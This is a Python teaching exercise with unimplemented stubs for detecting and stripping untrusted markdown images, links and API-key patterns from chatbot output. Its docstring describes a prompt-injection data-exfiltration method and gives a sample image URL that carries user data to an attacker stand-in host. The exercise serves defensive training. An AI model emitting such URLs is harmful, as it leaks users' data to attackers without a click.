"""Day 73 · No leaks

A prompt injection can make a model write ![](https://evil.example/?q=<your data>). When the chat UI
renders that image, the data is sent to the attacker with zero clicks. Check every output before it renders.

Run `python quest.py 73` after each TODO.
"""
import re  # noqa: F401
from urllib.parse import urlparse  # noqa: F401

SECRET_PATTERNS = [r"sk-[A-Za-z0-9]{20,}", r"AKIA[0-9A-Z]{16}"]


def find_urls(markdown: str) -> list[tuple[str, str]]:
    """TODO 73.1 · Every image and link in the markdown, in order, as ("image", url) or ("link", url).
    Images look like ![alt](url), links like [text](url)."""
    raise NotImplementedError


def problems(output: str, allowed_domains: set[str]) -> list[str]:
    """TODO 73.2 · What's wrong, in this order:
      "image from <domain>"   for each image whose domain isn't in allowed_domains (images load by themselves!)
      "link to <domain>"      for each link whose domain isn't allowed
      "secret"                if any SECRET_PATTERNS match (once)"""
    raise NotImplementedError


def sanitise(output: str, allowed_domains: set[str]) -> str:
    """TODO 73.3 · Make it safe to render: replace each disallowed image with "[image removed]", each disallowed
    link with just its text, and each secret with "[secret removed]". Leave allowed images and links alone."""
    raise NotImplementedError
